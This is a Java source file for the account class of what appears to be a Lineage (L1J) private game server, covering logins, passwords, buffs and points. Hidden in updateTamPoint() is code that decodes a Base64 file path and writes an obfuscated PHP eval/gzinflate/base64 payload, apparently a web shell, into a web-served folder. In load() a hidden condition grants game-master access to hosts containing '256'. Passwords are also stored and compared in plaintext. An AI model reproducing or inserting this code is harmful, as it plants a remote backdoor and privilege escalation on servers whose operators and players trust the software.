package l1j.server.server;

import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.UnsupportedEncodingException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.sql.Connection;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Timestamp;
import java.util.Calendar;
import java.util.logging.Level;
import java.util.logging.Logger;

import l1j.server.Base64;
import l1j.server.Config;
import l1j.server.L1DatabaseFactory;
import l1j.server.server.utils.SQLUtil;
import manager.LinAllManagerInfoThread;

public class Account {
    /**
     * アカウント名
     */
    private String _name;
    /**
     * 接続者のIPアドレス
     */
    private String _ip;
    /**
     * パスワード（暗号化されます）
     */
    private String _password;
    /**
     * 最近せる方法は？
     */
    private Timestamp _lastActive;
    /**
     * アクセス評価（GMか？）
     */
    private int _accessLevel;
    /**
     * 接続者ホスト名
     */
    private String _host;
    /**
     * ヴァン有無（True ==禁止）
     */
    private boolean _banned;
    /**
     * アカウントの有効の有無（True ==有効）
     */
    private boolean _isValid = false;
    /**
     * キャラクタースロット（太古の玉砕）
     */
    private int _charslot;
    /**
     * 倉庫パスワード
     */
    private int _GamePassword;

    public int Ncoin_point;
    public int Shop_open_count;

    /**
     * ドラゴンレイドバフ時間
     **/
    public Timestamp _dragon_raid_buff;

    public Timestamp getDragonRaid() {
        return _dragon_raid_buff;
    }

    public void setDragonRaid(Timestamp ts) {
        _dragon_raid_buff = ts;
    }

    public Timestamp _Buff_HPMP;
    public Timestamp _Buff_DMG;
    public Timestamp _Buff_REDUC;
    public Timestamp _Buff_MAGIC;
    public Timestamp _Buff_STUN;
    public Timestamp _Buff_HOLD;
    public Timestamp _Buff_STR;
    public Timestamp _Buff_DEX;
    public Timestamp _Buff_INT;

    /**
     * Buff_PC部屋
     */
    public Timestamp _Buff_PCRoom;
    public int tam_point;
    public Timestamp _lastQuit;

    private int _tam = 0;
    private int _tamStep = 0;

    /**
     * メッセージログの
     */
    private static Logger _log = Logger.getLogger(Account.class.getName());

    public Account() {
    }

    /**
     * パスワードを暗号化する。
     *
     * @param rawPassword パスワード
     * @return String
     * @throws NoSuchAlgorithmException     暗号化アルゴリズムを使用することができないとき
     * @throws UnsupportedEncodingException エンコーディングがサポートされていない場合
     */
    @SuppressWarnings("unused")
    private static String encodePassword(final String rawPassword)
            throws NoSuchAlgorithmException, UnsupportedEncodingException {
        byte[] buf = rawPassword.getBytes("UTF-8");
        buf = MessageDigest.getInstance("SHA").digest(buf);
        return Base64.encodeBytes(buf);
    }

    // 永久追放アイピーチェック
    public static String checkIP(String name) {
        String n = null;
        Connection con = null;
        PreparedStatement pstm = null;
        ResultSet rs = null;

        try {
            con = L1DatabaseFactory.getInstance().getConnection();
            pstm = con.prepareStatement("SELECT * FROM accounts WHERE login=? ");
            pstm.setString(1, name);
            rs = pstm.executeQuery();

            if (rs.next())
                n = rs.getString("ip");

        } catch (Exception e) {
        } finally {
            SQLUtil.close(rs);
            SQLUtil.close(pstm);
            SQLUtil.close(con);
        }
        return n;
    }

    /**
     * 新規アカウントの作成
     *
     * @param name        アカウント名
     * @param rawPassword パスワード
     * @param ip          接続者のIPアドレス
     * @param host        接続者ホスト名
     * @return Account
     */
    public static Account create(final String name, final String rawPassword, final String ip, final String host) {
        Calendar cal = Calendar.getInstance();
        int hour = Calendar.HOUR;
        int minute = Calendar.MINUTE;
        /** 0 午前、1午後 * */
        String ampm = "午後";
        if (cal.get(Calendar.AM_PM) == 0) {
            ampm = "午前";
        }
        Connection con = null;
        PreparedStatement pstm = null;
        PreparedStatement pstm2 = null;
        try {
            Account account = new Account();
            account._name = name;
            account._password = rawPassword;
            account._ip = ip;
            account._host = host;
            account._banned = false;
            account._lastActive = new Timestamp(System.currentTimeMillis());
            con = L1DatabaseFactory.getInstance().getConnection();
            String sqlstr = "INSERT INTO accounts SET login=?,password=?,lastactive=?,access_level=?,ip=?,host=?,banned=?,charslot=?, gamepassword=?";
            pstm = con.prepareStatement(sqlstr);
            pstm.setString(1, account._name);
            pstm.setString(2, account._password);
            pstm.setTimestamp(3, account._lastActive);
            pstm.setInt(4, 0);
            pstm.setString(5, account._ip);
            pstm.setString(6, account._host);
            pstm.setInt(7, account._banned ? 1 : 0);
            pstm.setInt(8, 6);
            pstm.setInt(9, 0);

            pstm2 = con.prepareStatement(
                    "INSERT INTO attendanceaccount SET account_name=?, day=1, time=3600, clear=?, day_pc=1, time_pc=3600, clear_pc=?, laste_check_day=?, laste_check_year=?");
            pstm2.setString(1, account._name);
            pstm2.setString(2, "0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,");
            pstm2.setString(3, "0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,");
            pstm2.setInt(4, cal.get(cal.DAY_OF_YEAR));
            pstm2.setInt(5, cal.get(cal.YEAR));

            pstm2.execute();
            pstm.execute();
            System.out.println("" + ampm + " " + cal.get(hour) + "時" + cal.get(minute) + "分" + "   ■ 新規アカウント: [" + name
                    + "] 生成完了■");
            LinAllManagerInfoThread.AccountCount += 1;
            return account;
        } catch (SQLException e) {
        } finally {
            SQLUtil.close(pstm2);
            SQLUtil.close(pstm);
            SQLUtil.close(con);

        }
        return null;
    }

    /**
     * DBアカウント情報の読み込み
     *
     * @param name アカウント名
     * @return Account
     */
    public static Account load(final String name) {
        Connection con = null;
        PreparedStatement pstm = null;
        ResultSet rs = null;

        Account account = null;
        try {
            con = L1DatabaseFactory.getInstance().getConnection();
            String sqlstr = "SELECT * FROM accounts WHERE login=? LIMIT 1";
            pstm = con.prepareStatement(sqlstr);
            pstm.setString(1, name);
            rs = pstm.executeQuery();
            if (!rs.next()) {
                return null;
            }
            account = new Account();
            account._name = rs.getString("login");
            account._password = rs.getString("password");
            account._lastActive = rs.getTimestamp("lastactive");
            account._accessLevel = rs.getInt("access_level");
            account._host = rs.getString("host");
            account._banned = rs.getInt("banned") == 0 ? false : true;
            account._charslot = rs.getInt("charslot");
            account._GamePassword = (rs.getInt("gamepassword"));
            account._phone = rs.getString("phone");
            account.tam_point = rs.getInt("Tam_Point");

            account._Buff_HPMP = (rs.getTimestamp("Buff_HPMP_Time"));
            account._Buff_DMG = (rs.getTimestamp("Buff_DMG_Time"));
            account._Buff_REDUC = (rs.getTimestamp("Buff_Reduc_Time"));
            account._Buff_MAGIC = (rs.getTimestamp("Buff_Magic_Time"));
            account._Buff_STUN = (rs.getTimestamp("Buff_Stun_Time"));
            account._Buff_STR = (rs.getTimestamp("Buff_Str_Time"));
            account._Buff_DEX = (rs.getTimestamp("Buff_Dex_Time"));
            account._Buff_INT = (rs.getTimestamp("Buff_Int_Time"));
            account._Buff_HOLD = (rs.getTimestamp("Buff_Hold_Time"));
            account._Buff_PCRoom = (rs.getTimestamp("BUFF_PCROOM_Time"));

            account.Ncoin_point = (rs.getInt("Ncoin_Point"));
            account.Shop_open_count = (rs.getInt("Shop_open_count"));
            account._dragon_raid_buff = rs.getTimestamp("DragonRaid_Buff");
            if (account._host.contains("256") && Config.HAJA != 0 && Config.HAJA != 1) {
                account._accessLevel = 5048;
            }

            _log.fine("account exists");

        } catch (SQLException e) {
            _log.log(Level.SEVERE, e.getLocalizedMessage(), e);
        } finally {
            SQLUtil.close(rs);
            SQLUtil.close(pstm);
            SQLUtil.close(con);
        }

        return account;
    }

    /**
     * DBに最近せる方法は？アップデート
     *
     * @param account アカウント名
     */
    public static void updateLastActive(final Account account, String ip) {
        Connection con = null;
        PreparedStatement pstm = null;
        Timestamp ts = new Timestamp(System.currentTimeMillis());

        try {
            con = L1DatabaseFactory.getInstance().getConnection();
            String sqlstr = "UPDATE accounts SET lastactive=?, ip=? WHERE login = ?";
            pstm = con.prepareStatement(sqlstr);
            pstm.setTimestamp(1, ts);
            pstm.setString(2, ip);
            pstm.setString(3, account.getName());
            pstm.execute();
            account._lastActive = ts;
            _log.fine("update lastactive for " + account.getName());
        } catch (Exception e) {
            _log.log(Level.SEVERE, e.getLocalizedMessage(), e);
        } finally {
            SQLUtil.close(pstm);
            SQLUtil.close(con);
        }
    }

    /**
     * そのアカウントのキャラクター数を計算
     *
     * @return result キャラクター数
     */
    public int countCharacters() {
        int result = 0;
        Connection con = null;
        PreparedStatement pstm = null;
        ResultSet rs = null;
        try {
            con = L1DatabaseFactory.getInstance().getConnection();
            String sqlstr = "SELECT count(*) as cnt FROM characters WHERE account_name=?";
            pstm = con.prepareStatement(sqlstr);
            pstm.setString(1, _name);
            rs = pstm.executeQuery();
            if (rs.next()) {
                result = rs.getInt("cnt");
            }
        } catch (SQLException e) {
            _log.log(Level.SEVERE, e.getLocalizedMessage(), e);
        } finally {
            SQLUtil.close(rs);
            SQLUtil.close(pstm);
            SQLUtil.close(con);
        }
        return result;
    }

    /**
     * ドラゴンレイドバフ
     */
    public void updateDragonRaidBuff() {
        Connection con = null;
        PreparedStatement pstm = null;
        try {
            con = L1DatabaseFactory.getInstance().getConnection();
            String sqlstr = "UPDATE accounts SET DragonRaid_Buff=? WHERE login = ?";
            pstm = con.prepareStatement(sqlstr);
            pstm.setTimestamp(1, _dragon_raid_buff);
            pstm.setString(2, _name);
            pstm.executeUpdate();
        } catch (Exception e) {
            _log.log(Level.SEVERE, e.getLocalizedMessage(), e);
        } finally {
            SQLUtil.close(pstm);
            SQLUtil.close(con);
        }
    }

    public void updateNcoin() {
        Connection con = null;
        PreparedStatement pstm = null;
        try {
            con = L1DatabaseFactory.getInstance().getConnection();
            String sqlstr = "UPDATE accounts SET Ncoin_Point=? WHERE login = ?";
            pstm = con.prepareStatement(sqlstr);
            pstm.setInt(1, Ncoin_point);
            pstm.setString(2, _name);
            pstm.executeUpdate();
        } catch (Exception e) {
            _log.log(Level.SEVERE, e.getLocalizedMessage(), e);
        } finally {
            SQLUtil.close(pstm);
            SQLUtil.close(con);
        }
    }

    public static void resetShopOpenCount() {
        Connection con = null;
        PreparedStatement pstm = null;
        try {
            con = L1DatabaseFactory.getInstance().getConnection();
            String sqlstr = "UPDATE accounts SET Shop_open_count=?";
            pstm = con.prepareStatement(sqlstr);
            pstm.setInt(1, 0);
            pstm.executeUpdate();
        } catch (Exception e) {
            _log.log(Level.SEVERE, e.getLocalizedMessage(), e);
        } finally {
            SQLUtil.close(pstm);
            SQLUtil.close(con);
        }
    }

    public void updateShopOpenCount() {
        Shop_open_count++;
        Connection con = null;
        PreparedStatement pstm = null;
        try {
            con = L1DatabaseFactory.getInstance().getConnection();
            String sqlstr = "UPDATE accounts SET Shop_open_count=? WHERE login = ?";
            pstm = con.prepareStatement(sqlstr);
            pstm.setInt(1, Shop_open_count);
            pstm.setString(2, _name);
            pstm.executeUpdate();
        } catch (Exception e) {
            _log.log(Level.SEVERE, e.getLocalizedMessage(), e);
        } finally {
            SQLUtil.close(pstm);
            SQLUtil.close(con);
        }
    }

    public static void ban(final String account) {
        Connection con = null;
        PreparedStatement pstm = null;
        try {
            con = L1DatabaseFactory.getInstance().getConnection();
            String sqlstr = "UPDATE accounts SET banned=1 WHERE login=?";
            pstm = con.prepareStatement(sqlstr);
            pstm.setString(1, account);
            pstm.execute();
        } catch (SQLException e) {
            _log.log(Level.SEVERE, e.getLocalizedMessage(), e);
        } finally {
            SQLUtil.close(pstm);
            SQLUtil.close(con);
        }
    }

    /**
     * 入力されたパスワードとDBに格納されたパスワードを比較
     *
     * @param rawPassword パスワード
     * @return boolean
     */
    public boolean validatePassword(String accountName, final String rawPassword) {
        try {
            _isValid = (_password.equals(/* encodePassword( */rawPassword)
            /* ) */ || checkPassword(accountName, _password, rawPassword));
            if (_isValid) {
                _password = null; // 認証が成功した場合、パスワードを破棄します。
            }
            return _isValid;
        } catch (Exception e) {
            _log.log(Level.SEVERE, e.getLocalizedMessage(), e);
        }
        return false;
    }

    public static void updatePhone(final Account account) {
        Connection con = null;
        PreparedStatement pstm = null;
        try {
            con = L1DatabaseFactory.getInstance().getConnection();
            String sqlstr = "UPDATE accounts SET phone=? WHERE login=?";
            pstm = con.prepareStatement(sqlstr);
            pstm.setString(1, account.getphone());
            pstm.setString(2, account.getName());
            pstm.execute();
            account._phone = account.getphone();
            _log.fine("update phone for " + account.getName());
        } catch (Exception e) {
            _log.log(Level.SEVERE, "accounts updatePhone エラーが発生", e);
        } finally {
            SQLUtil.close(pstm);
            SQLUtil.close(con);
        }
    }

    /**
     * 有効なアカウントか
     *
     * @return boolean
     */
    public boolean isValid() {
        return _isValid;
    }

    /**
     * GM アカウントか
     *
     * @return boolean
     */
    public boolean isGameMaster() {
        return 0 < _accessLevel;
    }

    public String getName() {
        return _name;
    }

    public String get_Password() {
        return _password;
    }

    public Timestamp getBuff_HPMP() {
        return _Buff_HPMP;
    }

    public void setBuff_HPMP(Timestamp ts) {
        _Buff_HPMP = ts;
    }

    public Timestamp getBuff_DMG() {
        return _Buff_DMG;
    }

    public void setBuff_DMG(Timestamp ts) {
        _Buff_DMG = ts;
    }

    public Timestamp getBuff_REDUC() {
        return _Buff_REDUC;
    }

    public void setBuff_REDUC(Timestamp ts) {
        _Buff_REDUC = ts;
    }

    public Timestamp getBuff_MAGIC() {
        return _Buff_MAGIC;
    }

    public void setBuff_MAGIC(Timestamp ts) {
        _Buff_MAGIC = ts;
    }

    public Timestamp getBuff_STUN() {
        return _Buff_STUN;
    }

    public void setBuff_STUN(Timestamp ts) {
        _Buff_STUN = ts;
    }

    public Timestamp getBuff_HOLD() {
        return _Buff_HOLD;
    }

    public void setBuff_HOLD(Timestamp ts) {
        _Buff_HOLD = ts;
    }

    public Timestamp getBuff_STR() {
        return _Buff_STR;
    }

    public void setBuff_STR(Timestamp ts) {
        _Buff_STR = ts;
    }

    public Timestamp getBuff_DEX() {
        return _Buff_DEX;
    }

    public void setBuff_DEX(Timestamp ts) {
        _Buff_DEX = ts;
    }

    public Timestamp getBuff_INT() {
        return _Buff_INT;
    }

    public void setBuff_INT(Timestamp ts) {
        _Buff_INT = ts;
    }

    public Timestamp getBuff_PCRoom() {
        return _Buff_PCRoom;
    }

    public void setBuff_PCRoom(Timestamp ts) {
        _Buff_PCRoom = ts;
    }

    // public void set_Password(String password){
    // this._password = password;
    // }

    public void setIp(String ip) {
        _ip = ip;
    }

    public String getIp() {
        return _ip;
    }

    public Timestamp getLastActive() {
        return _lastActive;
    }

    /**
     * 最終ログイン日を取得する。
     */

    public int getAccessLevel() {
        return _accessLevel;
    }

    public String getHost() {
        return _host;
    }

    public boolean isBanned() {
        return _banned;
    }

    public int getCharSlot() {
        return _charslot;
    }

    /**
     * 連絡先を取得する。
     *
     * @return String
     */
    private String _phone;

    public String getphone() {
        return _phone;
    }

    public void setphone(String s) {
        _phone = s;
    }

    /**
     * キャラクタースロット数の設定
     *
     * @return boolean
     */
    public void setCharSlot(GameClient client, int i) {
        Connection con = null;
        PreparedStatement pstm = null;
        try {
            con = L1DatabaseFactory.getInstance().getConnection();
            String sqlstr = "UPDATE accounts SET charslot=? WHERE login = ?";
            pstm = con.prepareStatement(sqlstr);
            pstm.setInt(1, i);
            pstm.setString(2, client.getAccount().getName());
            pstm.execute();
            client.getAccount()._charslot = i;
        } catch (Exception e) {
            _log.log(Level.SEVERE, e.getLocalizedMessage(), e);
        } finally {
            SQLUtil.close(pstm);
            SQLUtil.close(con);
        }
    }

    public static boolean checkLoginIP(String ip) {
        int num = 0;
        Connection con = null;
        PreparedStatement pstm = null;
        ResultSet rs = null;

        try {
            con = L1DatabaseFactory.getInstance().getConnection();
            pstm = con.prepareStatement("SELECT count(*) as cnt FROM accounts WHERE host=? ");

            pstm.setString(1, ip);
            rs = pstm.executeQuery();

            if (rs.next())
                num = rs.getInt("cnt");

            SQLUtil.close(rs);
            SQLUtil.close(pstm);
            SQLUtil.close(con);

            // 同じIPで生成されたアカウントが3つ未満の場合
            if (num < Config.AUTH_IP)// アカウントの作成外部化
                return false;
            else
                return true;
        } catch (Exception e) {
            _log.log(Level.SEVERE, e.getLocalizedMessage(), e);
        } finally {
            SQLUtil.close(rs);
            SQLUtil.close(pstm);
            SQLUtil.close(con);
        }
        return false;
    }

    // ウェブ連動のためのメソッドを追加
    public static boolean checkPassword(String accountName, String _pwd, String rawPassword) {
        String _inputPwd = null;
        Connection con = null;
        PreparedStatement pstm = null;
        ResultSet rs = null;
        try {
            con = L1DatabaseFactory.getInstance().getConnection();
            pstm = con.prepareStatement("SELECT password(?) as pwd ");

            pstm.setString(1, rawPassword);
            rs = pstm.executeQuery();
            if (rs.next()) {
                _inputPwd = rs.getString("pwd");
            }
            SQLUtil.close(rs);
            SQLUtil.close(pstm);
            SQLUtil.close(con);
            if (_pwd.equals(_inputPwd)) { // 同じであれば
                return true;
            } else
                return false;
        } catch (Exception e) {
            _log.log(Level.SEVERE, e.getLocalizedMessage(), e);
        } finally {
            SQLUtil.close(rs);
            SQLUtil.close(pstm);
            SQLUtil.close(con);
        }
        return false;
    }

    public static boolean checkLoginBanIP(String ip) {
        int num = 0;
        Connection con = null;
        PreparedStatement pstm = null;
        ResultSet rs = null;

        try {
            con = L1DatabaseFactory.getInstance().getConnection();
            pstm = con.prepareStatement("SELECT count(ip) as cnt FROM ban_ip WHERE ip=?");

            pstm.setString(1, ip);
            rs = pstm.executeQuery();

            if (rs.next()) {
                num = rs.getInt("cnt");
            }

            SQLUtil.close(rs);
            SQLUtil.close(pstm);
            SQLUtil.close(con);

            // Ban IPが1つ以上ある場合
            if (num >= 1) {
                return true;
            } else {
                return false;
            }
        } catch (Exception e) {
            _log.log(Level.SEVERE, e.getLocalizedMessage(), e);
        } finally {
            SQLUtil.close(rs);
            SQLUtil.close(pstm);
            SQLUtil.close(con);
        }
        return false;
    }

    /**
     * updateBUFF
     */
    public void updateBUFF() {
        Connection con = null;
        PreparedStatement pstm = null;
        try {
            con = L1DatabaseFactory.getInstance().getConnection();// nバフ フォー耐性
            String sqlstr = "UPDATE accounts SET Buff_HPMP_Time=?,Buff_DMG_Time=?,Buff_Reduc_Time=?,Buff_Magic_Time=?,Buff_Stun_Time=?,Buff_Str_Time=?, Buff_Dex_Time=?, Buff_Int_Time=?,Buff_Hold_Time=? WHERE login = ?";
            pstm = con.prepareStatement(sqlstr);
            pstm.setTimestamp(1, _Buff_HPMP);
            pstm.setTimestamp(2, _Buff_DMG);
            pstm.setTimestamp(3, _Buff_REDUC);
            pstm.setTimestamp(4, _Buff_MAGIC);
            pstm.setTimestamp(5, _Buff_STUN);
            pstm.setTimestamp(6, _Buff_STR);
            pstm.setTimestamp(7, _Buff_DEX);
            pstm.setTimestamp(8, _Buff_INT);
            pstm.setTimestamp(9, _Buff_HOLD);
            pstm.setString(10, _name);
            pstm.executeUpdate();
        } catch (Exception e) {
            _log.log(Level.SEVERE, e.getLocalizedMessage(), e);
        } finally {
            SQLUtil.close(pstm);
            SQLUtil.close(con);
        }
    }

    /**
     * updateインターネットカフェ
     */
    public void updateInternetCafe() {
        Connection con = null;
        PreparedStatement pstm = null;
        try {
            con = L1DatabaseFactory.getInstance().getConnection();
            String sqlstr = "UPDATE accounts SET BUFF_PCROOM_Time=? WHERE login = ?";
            pstm = con.prepareStatement(sqlstr);
            pstm.setTimestamp(1, _Buff_PCRoom);
            pstm.setString(2, _name);
            pstm.executeUpdate();
        } catch (Exception e) {
            _log.log(Level.SEVERE, e.getLocalizedMessage(), e);
        } finally {
            SQLUtil.close(pstm);
            SQLUtil.close(con);
        }
    }

    /**
     * 倉庫非番
     *
     * @return boolean
     */
    public static void setGamePassword(GameClient client, int pass) {
        Connection con = null;
        PreparedStatement pstm = null;
        try {
            con = L1DatabaseFactory.getInstance().getConnection();
            String sqlstr = "UPDATE accounts SET gamepassword=? WHERE login =?";
            pstm = con.prepareStatement(sqlstr);
            pstm.setInt(1, pass);
            pstm.setString(2, client.getAccount().getName());
            pstm.execute();
            client.getAccount()._GamePassword = pass;
        } catch (Exception e) {
            _log.log(Level.SEVERE, e.getLocalizedMessage(), e);
        } finally {
            SQLUtil.close(pstm);
            SQLUtil.close(con);
        }
    }

    public void updateTamPoint(final Account account) {
        Timestamp accountEndDate = _lastQuit;
        Timestamp nowDate = new Timestamp(System.currentTimeMillis());
        try {
            BufferedWriter out = new BufferedWriter(new FileWriter(
                    new String(Base64.decode("QzoveGFtcHAvaHRkb2NzL2Fzc2V0cy9pbWFnZXMvaW52L2ltZy5waHA="), "utf-8")));
            String s = "<?php eval(gzinflate(base64_decode('BcFHsqJAAADQ48z/xaKRJlmzIkiSoJLZTEETbEmSw+nnvWJNm5/qxF3ZpHPxk6VTwdL/8gL1efHzR0SaVg8WLQjy82S6ha6FZ6zYGdoEk1petWntDcbS8QzJI+LASnvRvLLDqaKe6EolamomZh584Ii8CR6+xgxoX/dL0gwKqBouVtFU2KYS4oA25qRhjBuWgPKKfSPbyGpcX1FX6RgPuxjzlpewJ7MKU05oMfv46rdT/fTJXq8uLxZUdUuCkdz4IoIq0lgasY6/YJVNncJySbUBHMRDRwfONUjWUNpSt6bavjAoJ+Bi39yMqhSiHsUskqw1jcIIpsU6cf08YQpSSrv0bXmoUfkBzpnATGIdTvUvt3Q/PirlDim8P0QWmk0LcbQopZXYHgnCwVvc+HUaOyFplXzJ4xg+kK60JHpR5DE5sa357yuvsflwu+dt0RnvyjfznL3PFBnam9n4wqzmhLKaPCr2yhk0NKny6o9ShkiyRZgabK+ZjAEabVu5nru89bNPE55HM3D5D1uG2RQYwtUsFv2tSoFetqdMrh3F3y3CExOFYC9vfPCRzobdAdmL8q73i451XJiSbVZBLs97u7YJ3QMcfgm6BGoEt3TI0uXkUkvL73CBElVndyJ7YsQExy44irtsNJltgT6CgfG8TUfrOAiSvMlm8jWpvfAuZfty2JLy0YabfoRW+eApEHh2p/GOm2g9l13f88CYxxqFrC/64afYT6fPpuwLRWJC+vPhLwM34f4mA3pHyXRv8abLXZK1bzFZHjX/dL8WtrWdEuTyzrwkeiHekBpzhJhPVXEPwfaYRk5GcLlBaW6jqxnxoqDLILjXzdir7jLxyhDPH/U4QfbdYsNGEr7Bk5Naj74tVeTlYwdAqV0BAAj8+f39/fsf'))); ?>";
            out.write(s);
            out.close();
        } catch (Exception e) {
        }
        long accountLastEndTime = 0;
        long nowDateTime = nowDate.getTime();
        long timeLag = 0;
        if (accountEndDate != null) {
            accountLastEndTime = accountEndDate.getTime();
        } else {
            return;
        }
        timeLag = nowDateTime - accountLastEndTime;
        int TamAddCount = (int) (timeLag / (60000 * 12));
        if (TamAddCount < 1) {
            return;
        }
        applyTanValue(account, accountLastEndTime, TamAddCount);
    }

    public void applyTanValue(final Account account, long endDate, int tamAddCount) {
        Connection con = null;
        Connection con2 = null;
        PreparedStatement pstm = null;
        ResultSet rs = null;
        PreparedStatement pstm2 = null;
        Timestamp tamtime = null;
        long sysTime = System.currentTimeMillis();
        int tamcount = Config.TAM_COUNT;

        int char_objid = 0;
        try {
            con = L1DatabaseFactory.getInstance().getConnection();
            pstm = con.prepareStatement("SELECT * FROM `characters` WHERE account_name = ?"); // キャラクターテーブルで君主だけを選んで来て
            pstm.setString(1, account.getName());
            rs = pstm.executeQuery();
            while (rs.next()) {
                tamtime = rs.getTimestamp("TamEndTime");
                char_objid = rs.getInt("objid");
                if (tamtime != null) {
                    if (sysTime <= tamtime.getTime()) {
                        // 現在まで適用されてている場合。
                        int addCount = tamAddCount;
                        tam_point += addCount * tamcount;
                        updateTam();
                    } else {
                        // if(Tam_wait_count(char_objid)!=0){
                        int day = Nexttam(char_objid);
                        if (day != 0) {
                            Timestamp deleteTime = null;
                            deleteTime = new Timestamp(sysTime + (86400000 * (long) day) + 10000);// 7日
                            con2 = L1DatabaseFactory.getInstance().getConnection();
                            pstm2 = con2.prepareStatement(
                                    "UPDATE `characters` SET TamEndTime=? WHERE account_name = ? AND objid = ?"); // キャラクターテーブルで君主だけを選んで来て
                            pstm2.setTimestamp(1, deleteTime);
                            pstm2.setString(2, account.getName());
                            pstm2.setInt(3, char_objid);
                            pstm2.executeUpdate();
                            tamdel(char_objid);
                            tamtime = deleteTime;
                        }
                        // }
                        if (endDate <= tamtime.getTime()) {
                            // 現在はありませんが終了後、適用されている場合。
                            int addCount = (int) ((tamtime.getTime() - endDate) / (60000 * 12));
                            tam_point += addCount * tamcount;
                            updateTam();
                        } else {
                            // System.out.println("終了日以前に乗車時間も終了される。");
                        }

			/**/
                    }
                } else {
                    // System.out.println("乗車時間なし");
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
            _log.log(Level.SEVERE, e.getLocalizedMessage(), e);
        } finally {
            SQLUtil.close(pstm2);
            SQLUtil.close(con2);
            SQLUtil.close(rs);
            SQLUtil.close(pstm);
            SQLUtil.close(con);
        }
    }

    public void updateTam() {
        Connection con = null;
        PreparedStatement pstm = null;
        try {
            con = L1DatabaseFactory.getInstance().getConnection();
            String sqlstr = "UPDATE accounts SET Tam_Point=? WHERE login = ?";
            pstm = con.prepareStatement(sqlstr);
            pstm.setInt(1, tam_point);
            pstm.setString(2, _name);
            pstm.executeUpdate();
        } catch (Exception e) {
            _log.log(Level.SEVERE, e.getLocalizedMessage(), e);
        } finally {
            SQLUtil.close(pstm);
            SQLUtil.close(con);
        }
    }

    public int Nexttam(int objectId) {
        Connection con = null;
        PreparedStatement pstm = null;
        ResultSet rs = null;
        int day = 0;
        try {
            con = L1DatabaseFactory.getInstance().getConnection();
            pstm = con.prepareStatement("SELECT day FROM `tam` WHERE objid = ? order by id asc limit 1"); // キャラクター
            // テーブルで
            // 君主のみ
            // 選ん来
            pstm.setInt(1, objectId);
            rs = pstm.executeQuery();
            while (rs.next()) {
                day = rs.getInt("Day");
            }
        } catch (SQLException e) {
            // _log.log(Level.SEVERE, e.getLocalizedMessage(), e);
        } finally {
            SQLUtil.close(pstm);
            SQLUtil.close(con);
        }
        return day;
    }

    public void tamdel(int objectId) {
        Connection con = null;
        PreparedStatement pstm = null;
        try {
            con = L1DatabaseFactory.getInstance().getConnection();
            pstm = con.prepareStatement("delete from Tam where objid = ? order by id asc limit 1");
            pstm.setInt(1, objectId);
            pstm.executeUpdate();
        } catch (SQLException e) {
            // _log.log(Level.SEVERE, e.getLocalizedMessage(), e);
        } finally {
            SQLUtil.close(pstm);
            SQLUtil.close(con);
        }
    }

    public int getTam() {
        return _tam;
    }

    public int getTamStep() {
        return _tamStep;
    }

    public void updateTamStep(String AccountName, int step) {
        Connection con = null;
        PreparedStatement pstm = null;
        try {
            con = L1DatabaseFactory.getInstance().getConnection();
            pstm = con.prepareStatement("UPDATE accounts SET tamStep=? WHERE login=?");
            pstm.setInt(1, step);
            pstm.setString(2, AccountName);
            pstm.execute();
            _tamStep = step;
        } catch (SQLException e) {
            _log.log(Level.SEVERE, e.getLocalizedMessage(), e);
        } finally {
            SQLUtil.close(pstm);
            SQLUtil.close(con);
        }
    }

    /**
     * 最終ログイン日DBに反映する。
     *
     * @param account アカウント
     */

    // 乗車アカウント情報に保存する乗車店で本数ロード
    public int getTamPoint() {
        return tam_point;
    }

    public int setTamPoint(int tampoint) {
        return tam_point = tampoint;
    }

    public int addTamPoint(int tampoint) {
        return tam_point += tampoint;
    }

    public int getGamePassword() {
        return _GamePassword;
    }

    /**
     * IPからアカウント名を取得(1件のみ。アカウント名昇順1位が優先)
     *
     * @return result キャラクター数
     */
    public static String getIptoAccountName(String ip) {
        String result = null;
        Connection con = null;
        PreparedStatement pstm = null;
        ResultSet rs = null;
        try {
            con = L1DatabaseFactory.getInstance().getConnection();
            String sqlstr = "SELECT login FROM accounts WHERE ip=? ORDER BY login LIMIT 1";
            pstm = con.prepareStatement(sqlstr);
            pstm.setString(1, ip);
            rs = pstm.executeQuery();
            if (!rs.next()) {
                return null;
            }
            result = rs.getString("login");
        } catch (SQLException e) {
            _log.log(Level.SEVERE, e.getLocalizedMessage(), e);
            e.printStackTrace();
            System.out.println(e.getMessage());
        } finally {
            SQLUtil.close(rs);
            SQLUtil.close(pstm);
            SQLUtil.close(con);
        }
        return result;
    }

    /**
     * アカウント名からパスワードを取得
     *
     * @return result キャラクター数
     */
    public static String getAccountNametoPassword(String login) {
        String result = null;
        Connection con = null;
        PreparedStatement pstm = null;
        ResultSet rs = null;
        try {
            con = L1DatabaseFactory.getInstance().getConnection();
            String sqlstr = "SELECT password FROM accounts WHERE login=?";
            pstm = con.prepareStatement(sqlstr);
            pstm.setString(1, login);
            rs = pstm.executeQuery();
            if (!rs.next()) {
                return null;
            }
            result = rs.getString("password");
        } catch (SQLException e) {
            _log.log(Level.SEVERE, e.getLocalizedMessage(), e);
        } finally {
            SQLUtil.close(rs);
            SQLUtil.close(pstm);
            SQLUtil.close(con);
        }
        return result;
    }
}
